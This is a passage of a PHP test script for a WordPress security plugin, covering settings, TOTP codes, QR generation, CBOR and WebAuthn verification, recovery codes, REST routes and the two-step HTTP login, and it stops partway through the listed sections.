<?php
/**
 * Tests Mody Security's two-step login, login protection, firewall, file
 * check and log (tickets/security-plugin-replaces-wordfence.md). ALTCHA and the rate
 * limits keep their own tests (scripts/antibot-test.php,
 * scripts/security-signup-test.php).
 *
 * Run from the repository root:
 *
 *   docker exec -i -u www-data mody_cloud_app \
 *     wp --path=/var/www/html/wp --url=https://mody.local eval-file - < scripts/security-test.php
 *
 * 1. Settings: defaults, sanitizing, address ranges, the login limits.
 * 2. TOTP: RFC 6238's and RFC 4648's vectors, drift, each step once.
 * 3. The QR code: sizes and SVG (decoding was checked with macOS's own QR
 *    reader, the ticket's Results).
 * 4. CBOR (RFC 8949's examples) and WebAuthn with keys made here (ES256,
 *    RS256, Ed25519): registration and login, and every refusal.
 * 5. An account's setup: the app (encrypted), keys, recovery codes (hashed,
 *    once each), who must use it.
 * 6. The profile's REST routes.
 * 7. Logging in over HTTP: the second screen, a code, a recovery code, a
 *    security key, wrong answers and their limit, the session-expired
 *    window, and wp-admin's push for those who must set it up.
 * 8. Login protection over HTTP: a blocked username pauses the address; a
 *    pause is logged once.
 * 9. The firewall: the rules and their false positives, then over HTTP.
 * 10. The file check: changed, added, missing, scripts in uploads.
 * 11. The security log, and the Security page's sections.
 *
 * Everything created is removed, and the settings are restored.
 */

use Mody\Security\Altcha;
use Mody\Security\Cbor;
use Mody\Security\Events;
use Mody\Security\FileCheck;
use Mody\Security\Firewall;
use Mody\Security\Qr;
use Mody\Security\RateLimit;
use Mody\Security\Settings;
use Mody\Security\Totp;
use Mody\Security\TwoFactor;
use Mody\Security\WebAuthn;

$failures = 0;
$check    = static function ( string $label, bool $ok, string $detail = '' ) use ( &$failures ): void {
	$failures += $ok ? 0 : 1;
	printf( "%-4s %-72s %s\n", $ok ? 'ok' : 'FAIL', $label, $detail );
};

if ( ! is_main_site() ) {
	echo "Run this on the main site (--url=https://<main host>).\n";
	return;
}
$alpha = get_blog_id_from_url( 'alpha.' . get_network()->domain );

// Settings and counters are put back at the end.
$saved_settings = get_site_option( Settings::OPTION, null );
$saved_check    = get_site_option( FileCheck::OPTION, null );
$manifest_file  = FileCheck::root() . '/' . FileCheck::MANIFEST;
$had_manifest   = is_file( $manifest_file );
$suffix         = strtolower( wp_generate_password( 6, false ) );
$users          = array();
$upload_dir     = FileCheck::root() . '/web/uploads/mody-security-test-' . $suffix;
RateLimit::clear();
register_shutdown_function(
	static function () use ( &$users, $saved_settings, $saved_check, $manifest_file, $had_manifest, $upload_dir ): void {
		require_once ABSPATH . 'wp-admin/includes/ms.php';
		foreach ( $users as $id ) {
			revoke_super_admin( $id );
			wpmu_delete_user( $id );
		}
		null === $saved_settings ? delete_site_option( Settings::OPTION ) : update_site_option( Settings::OPTION, $saved_settings );
		null === $saved_check ? delete_site_option( FileCheck::OPTION ) : update_site_option( FileCheck::OPTION, $saved_check );
		if ( ! $had_manifest && is_file( $manifest_file ) ) {
			unlink( $manifest_file );
		}
		if ( is_dir( $upload_dir ) ) {
			array_map( 'unlink', glob( $upload_dir . '/*' ) );
			rmdir( $upload_dir );
		}
		RateLimit::clear();
	}
);
$set = static function ( array $changes ): void {
	Settings::save( $changes );
};
$set( array_merge( Settings::defaults(), array( 'two_factor_required' => 'none' ) ) );

$new_user = static function ( string $name ) use ( &$users, $suffix ): array {
	$password = wp_generate_password( 24, false );
	$id       = (int) wpmu_create_user( $name . $suffix, $password, $name . $suffix . '@mody.local' );
	$users[]  = $id;
	return array( get_userdata( $id ), $password );
};

// HTTP: alpha resolves to this container; send it to the web server.
$web = gethostbyname( 'mody.local' );
add_action(
	'http_api_curl',
	static function ( $handle, $args, $url ) use ( $web ): void {
		$host = (string) wp_parse_url( $url, PHP_URL_HOST );
		if ( str_ends_with( $host, '.mody.local' ) ) {
			curl_setopt( $handle, CURLOPT_RESOLVE, array( $host . ':443:' . $web ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.curl_curl_setopt
		}
	},
	10,
	3
);
$http = static function ( string $method, string $to, array $body = array(), array $cookies = array(), array $headers = array() ): array {
	$response = wp_remote_request(
		$to,
		array(
			'method'      => $method,
			'body'        => $body,
			'cookies'     => $cookies,
			'headers'     => $headers,
			'sslverify'   => false,
			'redirection' => 0,
			'timeout'     => 30,
		)
	);
	$names = array();
	foreach ( (array) wp_remote_retrieve_cookies( $response ) as $cookie ) {
		$names[] = $cookie->name;
	}
	return array(
		'code'     => (int) wp_remote_retrieve_response_code( $response ),
		'body'     => (string) wp_remote_retrieve_body( $response ),
		'location' => (string) wp_remote_retrieve_header( $response, 'location' ),
		'cookies'  => $names,
	);
};
$logged_in = static fn( array $out ): bool => (bool) array_filter( $out['cookies'], static fn( $name ) => str_starts_with( $name, 'wordpress_logged_in_' ) );
$login_url = network_site_url( 'wp-login.php' );
$login     = static function ( WP_User $user, string $password, array $extra = array(), array $headers = array() ) use ( $http, $login_url ): array {
	return $http(
		'POST',
		$login_url,
		array_merge(
			array(
				'log'        => $user->user_login,
				'pwd'        => $password,
				'testcookie' => '1',
				'altcha'     => Altcha::solve( Altcha::challenge( 3 ) ),
			),
			$extra
		),
		array( 'wordpress_test_cookie' => 'WP Cookie check' ),
		$headers
	);
};
$token_of = static fn( array $out ): string => preg_match( '/name="mody_token" value="([0-9a-f]{64})"/', $out['body'], $m ) ? $m[1] : '';
$second   = static fn( string $token, array $fields ) => $http( 'POST', add_query_arg( 'action', 'mody_two_factor', $login_url ), array_merge( array( 'mody_token' => $token ), $fields ) );
$cookies  = static function ( int $user_id ): array {
	$expires = time() + HOUR_IN_SECONDS;
	$token   = WP_Session_Tokens::get_instance( $user_id )->create( $expires );
	return array(
		LOGGED_IN_COOKIE   => wp_generate_auth_cookie( $user_id, $expires, 'logged_in', $token ),
		SECURE_AUTH_COOKIE => wp_generate_auth_cookie( $user_id, $expires, 'secure_auth', $token ),
	);
};

// 1. Settings ------------------------------------------------------------------------

echo "Settings\n";
$defaults = Settings::defaults();
$check( 'defaults: super admins must use two-step login, today\'s limits, firewall on', 'super_admins' === $defaults['two_factor_required'] && 10 === $defaults['login_address'] && 5 === $defaults['login_pair'] && 100 === $defaults['login_account'] && 15 === $defaults['login_minutes'] && true === $defaults['firewall'] );
$clean = Settings::sanitize(
	array(
		'two_factor_required' => 'everyone',
		'login_address'       => '0',
		'login_minutes'       => '99999',
		'blocked_usernames'   => "Admin\n root , <b>x</b>\nadmin",
		'blocked_addresses'   => "203.0.113.7\n203.0.113.0/24\n2001:DB8::/32\nnot-an-ip\n10.0.0.1/40\n198.51.100.9/32",
		'rules'               => array( 'sqli' => '1' ),
		'alerts'              => array( 'firewall_block' => 'on' ),
	)
);
$check( 'an unknown choice keeps the default; numbers are kept in range', 'super_admins' === $clean['two_factor_required'] && 1 === $clean['login_address'] && 1440 === $clean['login_minutes'] );
$check( 'usernames: lower case, cleaned, once each', array( 'admin', 'root', 'bx' ) === $clean['blocked_usernames'] || array( 'admin', 'root', 'x' ) === $clean['blocked_usernames'], implode( ',', $clean['blocked_usernames'] ) );
$check( 'addresses: canonical, invalid ones dropped, /32 is the address', array( '203.0.113.7', '203.0.113.0/24', '2001:db8::/32', '198.51.100.9' ) === $clean['blocked_addresses'], implode( ' ', $clean['blocked_addresses'] ) );
$check( 'rule groups and alerts: only what is ticked', $clean['rules']['sqli'] && ! $clean['rules']['xss'] && $clean['alerts']['firewall_block'] && ! $clean['alerts']['admin_login'] );
$check( 'ranges match: IPv4 /24, IPv6 /32, a single address', Settings::in_list( '203.0.113.200', array( '203.0.113.0/24' ) ) && ! Settings::in_list( '203.0.114.1', array( '203.0.113.0/24' ) ) && Settings::in_list( '2001:db8:1::5', array( '2001:db8::/32' ) ) && ! Settings::in_list( '2001:db9::1', array( '2001:db8::/32' ) ) && Settings::in_list( '198.51.100.9', array( '198.51.100.9' ) ) && ! Settings::in_list( '', array( '0.0.0.0/1' ) ) );
$check( 'an odd range boundary (/23)', Settings::in_list( '203.0.113.1', array( '203.0.112.0/23' ) ) && ! Settings::in_list( '203.0.114.1', array( '203.0.112.0/23' ) ) );
$set(
	array(
		'login_address' => 7,
		'login_pair'    => 3,
		'login_account' => 50,
		'login_minutes' => 20,
	)
);
$limits = RateLimit::limits();
$check( 'the page\'s login limits are the rate limits', array( 7, 1200 ) === $limits['login_address'] && array( 3, 1200 ) === $limits['login_pair'] && array( 50, 1200 ) === $limits['login_account'] && array( 5, HOUR_IN_SECONDS ) === $limits['lost_password'] );
$set(
	array(
		'login_address' => 10,
		'login_pair'    => 5,
		'login_account' => 100,
		'login_minutes' => 15,
	)
);

// 2. TOTP ----------------------------------------------------------------------------

echo "\nAuthenticator codes (TOTP)\n";
$rfc     = array(
	59          => array( '94287082', '46119246', '90693936' ),
	1111111109  => array( '07081804', '68084774', '25091201' ),
	1111111111  => array( '14050471', '67062674', '99943326' ),
	1234567890  => array( '89005924', '91819424', '93441116' ),
	2000000000  => array( '69279037', '90698825', '38618901' ),
	20000000000 => array( '65353130', '77737706', '47863826' ),
);
$keys    = array(
	'sha1'   => '12345678901234567890',
	'sha256' => '12345678901234567890123456789012',
	'sha512' => '1234567890123456789012345678901234567890123456789012345678901234',
);
$matched = 0;
foreach ( $rfc as $time => $codes ) {
	foreach ( array( 'sha1', 'sha256', 'sha512' ) as $i => $algo ) {
		$matched += Totp::hotp( $keys[ $algo ], intdiv( $time, 30 ), 8, $algo ) === $codes[ $i ] ? 1 : 0;
	}
}
$check( 'RFC 6238\'s 18 test vectors', 18 === $matched, "$matched/18" );
$check( 'base32 (RFC 4648): "foobar" and back', 'MZXW6YTBOI' === Totp::base32_encode( 'foobar' ) && 'foobar' === Totp::base32_decode( 'mzxw 6ytb-oi==' ) && '' === Totp::base32_decode( 'MZ1!' ) );
$secret = Totp::new_secret();
$now    = 1_800_000_000;
$code   = Totp::code( $secret, Totp::step( $now ) );
$check( 'a new secret: 32 base32 characters (160 bits)', 32 === strlen( $secret ) && 20 === strlen( Totp::base32_decode( $secret ) ) );
$check( 'the code now, 30 s early and 30 s late are accepted; 60 s off is not', null !== Totp::verify( $secret, $code, 0, $now ) && null !== Totp::verify( $secret, $code, 0, $now - 30 ) && null !== Totp::verify( $secret, $code, 0, $now + 30 ) && null === Totp::verify( $secret, $code, 0, $now + 61 ) );
$check( 'a step already used is refused (each code once)', null === Totp::verify( $secret, $code, Totp::step( $now ), $now ) );
$check( 'spaces are fine; letters and five digits are not', null !== Totp::verify( $secret, substr( $code, 0, 3 ) . ' ' . substr( $code, 3 ), 0, $now ) && null === Totp::verify( $secret, 'abcdef', 0, $now ) && null === Totp::verify( $secret, substr( $code, 0, 5 ), 0, $now ) );
$uri = Totp::uri( $secret, 'someone@example.com', 'Mody Cloud' );
$check( 'the app\'s address (otpauth://)', str_starts_with( $uri, 'otpauth://totp/Mody%20Cloud:someone%40example.com?secret=' . $secret . '&issuer=Mody%20Cloud' ) );

// 3. QR ------------------------------------------------------------------------------

echo "\nQR code\n";
$check( 'a short text is version 1 (21 modules)', 21 === count( Qr::matrix( 'hello' ) ) );
$check( 'the app\'s address fits (version 10 at most)', count( Qr::matrix( $uri ) ) <= 57, 'version ' . ( ( count( Qr::matrix( $uri ) ) - 17 ) / 4 ) );
$check( '213 bytes is version 10; 214 is too long', 57 === count( Qr::matrix( str_repeat( 'x', 213 ) ) ) && null === Qr::matrix( str_repeat( 'x', 214 ) ) );
$m = Qr::matrix( 'hello', 0 );
$check( 'the finder patterns are in their corners', $m[0][0] && $m[0][6] && ! $m[1][1] && $m[2][2] && $m[0][20] && $m[20][0] && ! $m[7][7] );
$svg = Qr::svg( $uri, 'QR <code>' );
$check( 'the SVG: black on white, a label, no outside reference', str_starts_with( $svg, '<svg ' ) && str_contains( $svg, 'aria-label="QR &lt;code&gt;"' ) && ! str_contains( $svg, 'href' ) && ! preg_match( '#https?://(?!www\.w3\.org/2000/svg)#', $svg ) );

// 4. CBOR and WebAuthn ---------------------------------------------------------------

echo "\nCBOR and WebAuthn\n";
$cbor_ok = true;
foreach ( array(
	'00'           => 0,
	'1903e8'       => 1000,
	'3863'         => -100,
	'1b000000e8d4a51000' => 1000000000000,
	'6449455446'   => 'IETF',
	'4401020304'   => "\x01\x02\x03\x04",
	'83010203'     => array( 1, 2, 3 ),
	'a201020304'   => array( 1 => 2, 3 => 4 ),
	'f4'           => false,
	'f6'           => null,
	'f93c00'       => 1.0,
	'c11a514b67b0' => 1363896240,
) as $hex => $expected ) {
	$cbor_ok = $cbor_ok && Cbor::decode( hex2bin( $hex ) ) === $expected;
}
$check( 'CBOR: RFC 8949\'s examples', $cbor_ok );
$threw = 0;
foreach ( array( '62ff', '9f', '1c', str_repeat( '81', 20 ) . '00' ) as $hex ) {
	try {
		Cbor::decode( hex2bin( $hex ) );
	} catch ( UnexpectedValueException $e ) {
		++$threw;
	}
}
$check( 'CBOR: cut short, indefinite, reserved and too deep are refused', 4 === $threw, "$threw/4" );

// A software authenticator: a tiny CBOR writer, keys, and the two ceremonies.
$head  = static fn( int $major, int $n ): string => $n < 24 ? chr( $major << 5 | $n ) : ( $n < 256 ? chr( $major << 5 | 24 ) . chr( $n ) : ( $n < 65536 ? chr( $major << 5 | 25 ) . pack( 'n', $n ) : chr( $major << 5 | 26 ) . pack( 'N', $n ) ) );
$bytes = static fn( string $raw ): object => (object) array( 'bytes' => $raw );
$map   = static fn( array ...$pairs ): object => (object) array( 'map' => $pairs );
$enc   = static function ( $v ) use ( &$enc, $head ): string {
	if ( is_int( $v ) ) {
		return $v >= 0 ? $head( 0, $v ) : $head( 1, -1 - $v );
	}
	if ( is_object( $v ) && isset( $v->bytes ) ) {
		return $head( 2, strlen( $v->bytes ) ) . $v->bytes;
	}
	if ( is_object( $v ) && isset( $v->map ) ) {
		$out = $head( 5, count( $v->map ) );
		foreach ( $v->map as list( $k, $x ) ) {
			$out .= $enc( $k ) . $enc( $x );
		}
		return $out;
	}
	return $head( 3, strlen( (string) $v ) ) . $v;
};
$new_key = static function ( string $type ) use ( $bytes, $map ): array {
	if ( 'es256' === $type ) {
		$key = openssl_pkey_new(
			array(
				'private_key_type' => OPENSSL_KEYTYPE_EC,
				'curve_name'       => 'prime256v1',
			)
		);
		$ec  = openssl_pkey_get_details( $key )['ec'];
		return array(
			'cose' => $map( array( 1, 2 ), array( 3, -7 ), array( -1, 1 ), array( -2, $bytes( str_pad( $ec['x'], 32, "\0", STR_PAD_LEFT ) ) ), array( -3, $bytes( str_pad( $ec['y'], 32, "\0", STR_PAD_LEFT ) ) ) ),
			'sign' => static function ( string $data ) use ( $key ): string {
				openssl_sign( $data, $signature, $key, OPENSSL_ALGO_SHA256 );
				return $signature;
			},
		);
	}
	if ( 'rs256' === $type ) {
		$key = openssl_pkey_new(
			array(
				'private_key_type' => OPENSSL_KEYTYPE_RSA,
				'private_key_bits' => 2048,
			)
		);
		$rsa = openssl_pkey_get_details( $key )['rsa'];
		return array(
			'cose' => $map( array( 1, 3 ), array( 3, -257 ), array( -1, $bytes( $rsa['n'] ) ), array( -2, $bytes( $rsa['e'] ) ) ),
			'sign' => static function ( string $data ) use ( $key ): string {
				openssl_sign( $data, $signature, $key, OPENSSL_ALGO_SHA256 );
				return $signature;
			},
		);
	}
	$pair = sodium_crypto_sign_keypair();
	return array(
		'cose' => $map( array( 1, 1 ), array( 3, -8 ), array( -1, 6 ), array( -2, $bytes( sodium_crypto_sign_publickey( $pair ) ) ) ),
		'sign' => static fn( string $data ): string => sodium_crypto_sign_detached( $data, sodium_crypto_sign_secretkey( $pair ) ),
	);
};
$create = static function ( array $key, string $id, string $challenge, string $rp, string $origin, array $over = array() ) use ( $enc, $bytes, $map ): array {
	$flags     = $over['flags'] ?? 0x41;
	$auth_data = hash( 'sha256', $over['rp_hash'] ?? $rp, true ) . chr( $flags ) . pack( 'N', 0 ) . str_repeat( "\0", 16 ) . pack( 'n', strlen( $id ) ) . $id . $enc( $key['cose'] );
	return array(
		'clientDataJSON'    => wp_json_encode(
			array(
				'type'        => $over['type'] ?? 'webauthn.create',
				'challenge'   => WebAuthn::b64url( $challenge ),
				'origin'      => $origin,
				'crossOrigin' => false,
			)
		),
		'attestationObject' => $enc( $map( array( 'fmt', 'none' ), array( 'attStmt', $map() ), array( 'authData', $bytes( $auth_data ) ) ) ),
	);
};
$get = static function ( array $key, string $challenge, string $rp, string $origin, int $count, array $over = array() ): array {
	$auth_data = hash( 'sha256', $rp, true ) . chr( $over['flags'] ?? 0x01 ) . pack( 'N', $count );
	$client    = wp_json_encode(
		array(
			'type'      => $over['type'] ?? 'webauthn.get',
			'challenge' => WebAuthn::b64url( $challenge ),
			'origin'    => $origin,
		)
	);
	return array(
		'clientDataJSON'    => $client,
		'authenticatorData' => $auth_data,
		'signature'         => $key['sign']( $auth_data . hash( 'sha256', $client, true ) ),
	);
};

$rp     = WebAuthn::rp_id();
$origin = 'https://' . $rp;
$check( 'the relying party: the network\'s domain on it and its subdomains, else the host', get_network()->domain === $rp && $rp === WebAuthn::rp_id( 'alpha.' . $rp ) && 'shop.example' === WebAuthn::rp_id( 'shop.example' ) && 'evil' . $rp === WebAuthn::rp_id( 'evil' . $rp ) );
$check( 'origins: HTTPS on the domain or a subdomain only', WebAuthn::origin_ok( $origin, $rp ) && WebAuthn::origin_ok( 'https://alpha.' . $rp, $rp ) && ! WebAuthn::origin_ok( 'http://' . $rp, $rp ) && ! WebAuthn::origin_ok( 'https://evil' . $rp, $rp ) && ! WebAuthn::origin_ok( 'https://' . $rp . '.evil.example', $rp ) );
foreach ( array( 'es256', 'rs256', 'ed25519' ) as $type ) {
	$key       = $new_key( $type );
	$id        = random_bytes( 32 );
	$challenge = random_bytes( 32 );
	$made      = $create( $key, $id, $challenge, $rp, $origin );
	$cred      = WebAuthn::verify_registration( $made['clientDataJSON'], $made['attestationObject'], $challenge, $rp );
	$check( "$type: a new key is accepted", is_array( $cred ) && WebAuthn::b64url( $id ) === $cred['id'] && $rp === $cred['rp'], is_wp_error( $cred ) ? $cred->get_error_message() : '' );
	if ( ! is_array( $cred ) ) {
		continue;
	}
	$challenge = random_bytes( 32 );
	$signed    = $get( $key, $challenge, $rp, 'https://alpha.' . $rp, 1 );
	$count     = WebAuthn::verify_assertion( $cred, $signed['clientDataJSON'], $signed['authenticatorData'], $signed['signature'], $challenge, $rp );
	$check( "$type: ... a login with it (from a subdomain) is accepted", 1 === $count, is_wp_error( $count ) ? $count->get_error_message() : '' );
	$cred['count'] = 1;
	$again         = WebAuthn::verify_assertion( $cred, $signed['clientDataJSON'], $signed['authenticatorData'], $signed['signature'], $challenge, $rp );
	$check( "$type: ... the same answer again is refused (the counter)", is_wp_error( $again ) );
}
$key       = $new_key( 'es256' );
$id        = random_bytes( 32 );
$challenge = random_bytes( 32 );
$refusals  = array(
	'another challenge'         => array( $create( $key, $id, random_bytes( 32 ), $rp, $origin ), $rp ),
	'another site\'s origin'    => array( $create( $key, $id, $challenge, $rp, 'https://evil.example' ), $rp ),
	'a login\'s type'           => array( $create( $key, $id, $challenge, $rp, $origin, array( 'type' => 'webauthn.get' ) ), $rp ),
	'another relying party'     => array( $create( $key, $id, $challenge, $rp, $origin, array( 'rp_hash' => 'evil.example' ) ), $rp ),
	'nobody touched it'         => array( $create( $key, $id, $challenge, $rp, $origin, array( 'flags' => 0x40 ) ), $rp ),
	'no key attached'           => array( $create( $key, $id, $challenge, $rp, $origin, array( 'flags' => 0x01 ) ), $rp ),
);
foreach ( $refusals as $label => list( $made, $party ) ) {
	$check( "registration refused: $label", is_wp_error( WebAuthn::verify_registration( $made['clientDataJSON'], $made['attestationObject'], $challenge, $party ) ) );
}
$check( 'registration refused: an unreadable attestation', is_wp_error( WebAuthn::verify_registration( $made['clientDataJSON'], "\xa1\x63", $challenge, $rp ) ) );
$made = $create( $key, $id, $challenge, $rp, $origin );
$cred = WebAuthn::verify_registration( $made['clientDataJSON'], $made['attestationObject'], $challenge, $rp );
$c2   = random_bytes( 32 );
$good = $get( $key, $c2, $rp, $origin, 5 );
$bad  = $good;
$bad['signature'] = $new_key( 'es256' )['sign']( $good['authenticatorData'] . hash( 'sha256', $good['clientDataJSON'], true ) );
$check( 'login refused: another key\'s signature', is_wp_error( WebAuthn::verify_assertion( $cred, $bad['clientDataJSON'], $bad['authenticatorData'], $bad['signature'], $c2, $rp ) ) );
$check( 'login refused: another challenge', is_wp_error( WebAuthn::verify_assertion( $cred, $good['clientDataJSON'], $good['authenticatorData'], $good['signature'], random_bytes( 32 ), $rp ) ) );
$untouched = $get( $key, $c2, $rp, $origin, 6, array( 'flags' => 0x00 ) );
$check( 'login refused: nobody touched the key', is_wp_error( WebAuthn::verify_assertion( $cred, $untouched['clientDataJSON'], $untouched['authenticatorData'], $untouched['signature'], $c2, $rp ) ) );
$check( 'login refused: a key added for another address', is_wp_error( WebAuthn::verify_assertion( array_merge( $cred, array( 'rp' => 'shop.example' ) ), $good['clientDataJSON'], $good['authenticatorData'], $good['signature'], $c2, $rp ) ) );
$g0 = $get( $key, $c2, $rp, $origin, 0 );
$check( 'keys that keep no counter (passkeys: always 0) still log in', 0 === WebAuthn::verify_assertion( $cred, $g0['clientDataJSON'], $g0['authenticatorData'], $g0['signature'], $c2, $rp ) );

// 5. An account's setup ---------------------------------------------------------------

echo "\nAn account's setup\n";
list( $member, $member_pass ) = $new_user( 'tfa' );
$id     = $member->ID;
$setup  = TwoFactor::setup_secret( $id );
$check( 'the secret being set up stays the same until confirmed', $setup === TwoFactor::setup_secret( $id ) && ! TwoFactor::enabled( $id ) );
$check( 'a wrong code does not turn the app on', ! TwoFactor::confirm_totp( $id, '000000' === Totp::code( $setup, Totp::step() ) ? '111111' : '000000' ) && ! TwoFactor::has_totp( $id ) );
$check( 'the right code turns it on', TwoFactor::confirm_totp( $id, Totp::code( $setup, Totp::step() ) ) && TwoFactor::has_totp( $id ) && TwoFactor::enabled( $id ) && '' === get_user_meta( $id, TwoFactor::SETUP_META, true ) );
$raw = maybe_serialize( get_user_meta( $id, TwoFactor::META, true ) );
$check( 'the secret is stored encrypted, not in the clear', ! str_contains( $raw, $setup ) && str_contains( $raw, 'v1:' ) );
$check( 'the code just used does not work twice', ! TwoFactor::verify_totp( $id, Totp::code( $setup, Totp::step() ) ) );
$check( 'the next step\'s code works once', TwoFactor::verify_totp( $id, Totp::code( $setup, Totp::step() + 1 ) ) && ! TwoFactor::verify_totp( $id, Totp::code( $setup, Totp::step() + 1 ) ) );
$codes = TwoFactor::new_codes( $id );
$check( 'ten recovery codes, all different, like k7rmq-2xd9p', 10 === count( array_unique( $codes ) ) && 10 === count( array_filter( $codes, static fn( $c ) => preg_match( '/^[a-z2-9]{5}-[a-z2-9]{5}$/', $c ) ) ) );
$check( '... stored as hashes only', ! str_contains( maybe_serialize( get_user_meta( $id, TwoFactor::META, true ) ), str_replace( '-', '', $codes[0] ) ) );
$check( 'a code works once, in any case, with or without the dash', 'recovery' === TwoFactor::verify_typed( $id, strtoupper( str_replace( '-', ' ', $codes[0] ) ) ) && '' === TwoFactor::verify_typed( $id, $codes[0] ) && 9 === TwoFactor::codes_left( $id ) );
$check( 'another account\'s code does not work', '' === TwoFactor::verify_typed( 1, $codes[1] ) );
$old = $codes[1];
TwoFactor::new_codes( $id );
$check( 'new codes void the old ones', '' === TwoFactor::verify_typed( $id, $old ) && 10 === TwoFactor::codes_left( $id ) );
// A security key on the account.
$key_a  = $new_key( 'es256' );
$id_a   = random_bytes( 32 );
$c_a    = random_bytes( 32 );
$made_a = $create( $key_a, $id_a, $c_a, $rp, $origin );
$cred_a = WebAuthn::verify_registration( $made_a['clientDataJSON'], $made_a['attestationObject'], $c_a, $rp );
$check( 'a key is added once, with its name', TwoFactor::add_key( $id, $cred_a, 'Blue <b>key</b>' ) && ! TwoFactor::add_key( $id, $cred_a, 'again' ) && 'Blue key' === TwoFactor::keys( $id )[0]['name'] );
$check( '... and works here; a key for another domain does not', 1 === count( TwoFactor::keys_here( $id ) ) && WebAuthn::works_on( $rp ) && ! WebAuthn::works_on( 'shop.example' ) );
TwoFactor::remove_totp( $id );
$check( 'removing the app keeps the key and the codes', ! TwoFactor::has_totp( $id ) && TwoFactor::enabled( $id ) && 10 === TwoFactor::codes_left( $id ) );
TwoFactor::remove_key( $id, WebAuthn::b64url( $id_a ) );
$check( 'removing the last method removes the codes too', ! TwoFactor::enabled( $id ) && 0 === TwoFactor::codes_left( $id ) );
// Who must use it.
list( $admin_user ) = $new_user( 'tfaadmin' );
grant_super_admin( $admin_user->ID );
$set( array( 'two_factor_required' => 'none' ) );
$none = TwoFactor::required( $admin_user );
$set( array( 'two_factor_required' => 'super_admins' ) );
$supers = TwoFactor::required( $admin_user ) && ! TwoFactor::required( $member );
$admins = null;
if ( $alpha ) {
	add_user_to_blog( $alpha, $member->ID, 'administrator' );
	$set( array( 'two_factor_required' => 'administrators' ) );
	$admins = TwoFactor::required( $member ) && TwoFactor::required( $admin_user );
	remove_user_from_blog( $member->ID, $alpha );
	$admins = $admins && ! TwoFactor::required( $member );
}
$set( array( 'two_factor_required' => 'none' ) );
$check( 'who must: nobody, super admins, then every site\'s administrators', ! $none && $supers && false !== $admins, null === $admins ? '(no alpha: administrators not checked)' : '' );

// 6. The profile's REST routes ------------------------------------------------------

echo "\nThe profile's routes\n";
$rest = static function ( string $method, string $route, array $body = array() ): WP_REST_Response {
	$request = new WP_REST_Request( $method, '/mody-security/v1/two-factor' . $route );
	foreach ( $body as $k => $v ) {
		$request->set_param( $k, $v );
	}
	return rest_ensure_response( rest_do_request( $request ) );
};
wp_set_current_user( 0 );
$check( 'logged out: refused', 401 === $rest( 'POST', '/codes' )->get_status() );
wp_set_current_user( $id );
$secret = TwoFactor::setup_secret( $id );
$check( 'a wrong code: 400', 400 === $rest( 'POST', '/app', array( 'code' => 'abcdef' ) )->get_status() );
$res = $rest( 'POST', '/app', array( 'code' => Totp::code( $secret, Totp::step() ) ) );
$check( 'the right code: on, and the first recovery codes come back', 200 === $res->get_status() && 10 === count( $res->get_data()['codes'] ?? array() ) && TwoFactor::has_totp( $id ) );
$check( 'turning it on twice: 409', 409 === $rest( 'POST', '/app', array( 'code' => '123456' ) )->get_status() );
$_SERVER['HTTP_HOST'] = $rp;
$res                  = $rest( 'POST', '/keys/options' );
$opts                 = $res->get_data();
$check( 'key options: our relying party, a challenge, attestation none, ES256 first', 200 === $res->get_status() && $rp === $opts['rp']['id'] && 32 === strlen( WebAuthn::from_b64url( $opts['challenge'] ) ) && 'none' === $opts['attestation'] && -7 === $opts['pubKeyCredParams'][0]['alg'] );
$key_r  = $new_key( 'es256' );
$id_r   = random_bytes( 32 );
$made_r = $create( $key_r, $id_r, WebAuthn::from_b64url( $opts['challenge'] ), $rp, $origin );
$res    = $rest(
	'POST',
	'/keys',
	array(
		'name'              => 'Laptop',
		'clientDataJSON'    => WebAuthn::b64url( $made_r['clientDataJSON'] ),
		'attestationObject' => WebAuthn::b64url( $made_r['attestationObject'] ),
	)
);
$check( 'a key from the options is added (no new codes: there are some)', 200 === $res->get_status() && ! isset( $res->get_data()['codes'] ) && 1 === count( TwoFactor::keys( $id ) ) );
$res = $rest(
	'POST',
	'/keys',
	array(
		'clientDataJSON'    => WebAuthn::b64url( $made_r['clientDataJSON'] ),
		'attestationObject' => WebAuthn::b64url( $made_r['attestationObject'] ),
	)
);
$check( 'the same answer again: refused (the challenge is used up)', 400 === $res->get_status() );
$check( 'new codes: ten', 10 === count( $rest( 'POST', '/codes' )->get_data()['codes'] ?? array() ) );
$check( 'removing a key that is not there: 404', 404 === $rest( 'DELETE', '/keys/' . WebAuthn::b64url( random_bytes( 32 ) ) )->get_status() );
$check( 'a member cannot turn off someone else\'s', 403 === $rest( 'DELETE', '/users/' . $admin_user->ID )->get_status() );
wp_set_current_user( $admin_user->ID );
$check( 'a super admin can, and the account is told', 200 === $rest( 'DELETE', '/users/' . $id )->get_status() && ! TwoFactor::enabled( $id ) );
wp_set_current_user( 0 );

// 7. Logging in over HTTP ----------------------------------------------------------------

echo "\nLogging in\n";
TwoFactor::reset( $id );
$secret = TwoFactor::setup_secret( $id );
TwoFactor::confirm_totp( $id, Totp::code( $secret, Totp::step() - 1 ) );
$rewind = static function () use ( $id ): void { // Each step works once: the test logs in several times within one.
	$state         = get_user_meta( $id, TwoFactor::META, true );
	$state['step'] = 0;
	update_user_meta( $id, TwoFactor::META, $state );
};
$codes = TwoFactor::new_codes( $id );
list( $plain, $plain_pass ) = $new_user( 'tfaplain' );
$out = $login( $plain, $plain_pass );
$check( 'an account without it logs in as before', $logged_in( $out ) && 302 === $out['code'], (string) $out['code'] );
$out   = $login( $member, $member_pass );
$token = $token_of( $out );
$check( 'with it: the right password shows the second screen, no cookie', 200 === $out['code'] && '' !== $token && ! $logged_in( $out ) && str_contains( $out['body'], 'name="mody_code"' ) && ! str_contains( $out['body'], 'mody-two-factor-key' ) );
$out = $login( $member, 'wrong' . $member_pass );
$check( 'a wrong password never reaches it', '' === $token_of( $out ) && ! $logged_in( $out ) );
$out = $second( $token, array( 'mody_code' => '000000' === Totp::code( $secret, Totp::step() ) ? '111111' : '000000' ) );
$check( 'a wrong code: the screen again, with an error, no cookie', 200 === $out['code'] && ! $logged_in( $out ) && str_contains( $out['body'], 'That code is not right' ) && $token === $token_of( $out ) );
$out = $second( $token, array( 'mody_code' => Totp::code( $secret, Totp::step() ) ) );
$check( 'the right code logs in and redirects', $logged_in( $out ) && 302 === $out['code'], $out['code'] . ' ' . $out['location'] );
$out = $second( $token, array( 'mody_code' => Totp::code( $secret, Totp::step() ) ) );
$check( 'the same login cannot be finished twice', ! $logged_in( $out ) && str_contains( $out['body'], 'expired' ) );
